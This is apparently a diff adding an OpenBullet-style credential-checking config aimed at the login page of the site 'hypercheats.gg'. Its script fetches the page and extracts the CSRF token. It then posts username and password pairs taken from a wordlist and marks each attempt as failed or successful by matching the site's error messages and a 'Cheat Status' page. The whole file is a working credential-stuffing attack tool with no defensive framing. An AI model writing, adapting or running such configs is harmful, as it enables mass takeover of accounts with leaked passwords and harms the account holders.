@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "hypercheats.gg",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-22T13:53:36.5431223+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://hypercheats.gg/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "hidden\" name=\"csrfKey\" value=\"" "\">" -> VAR "csrf" 
+REQUEST POST "https://hypercheats.gg/login/" 
+  CONTENT "csrfKey=<csrf>&ref=aHR0cHM6Ly9oeXBlcmNoZWF0cy5nZy9zdGF0dXMv&auth=<USER>&password=<PASS>&_processLogin=usernamepassword&_processLogin=usernamepassword" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The Display Name or Email Address you entered does not belong to any account. Make sure that it is typed correctly." 
+    KEY "The password you entered is incorrect. Please try again (make sure your caps lock is off)." 
+  KEYCHAIN Success OR 
+    KEY "Cheat Status" 
